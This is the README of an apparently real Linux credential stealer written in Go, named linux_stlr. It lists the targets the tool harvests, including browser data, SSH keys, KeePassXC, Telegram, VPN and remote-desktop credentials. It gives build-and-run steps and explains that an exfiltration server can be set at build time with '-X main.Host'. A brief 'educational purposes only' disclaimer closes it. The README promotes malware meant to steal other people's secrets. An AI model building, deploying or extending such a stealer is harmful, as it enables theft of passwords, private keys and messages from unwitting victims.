# linux_stlr

A linux stealer with support for:
- firefox based browsers
- chrome based browsers
- common files names
- gathering host information
- ssh keys
- remmina
- pidgin
- mullvad
- git
- telegram
- openvpn
- keepassxc

  ## How to build
  This stealer has support for uploading to a file server but a file server is not included in the repo. Instead, If a webserver is not injected at build time with `-X main.Host` it will gather all the files in a zip file and place it in the current directory.

1. Install golang:
  https://go.dev/doc/install

2. Compile:
```
GOOS=linux go build
```

3. Place on test machine:
4. Give executable permissions:
```
chmod +x ./linux_stlr
```
5. Execute
```
./linux_stlr
```
6. Now `s.zip` should appear in the directory of execution.

## Legal Disclaimer 
This project was made for educational purposes only. using infomation gathering tools on data that is not your own is ILLEGAL.


  
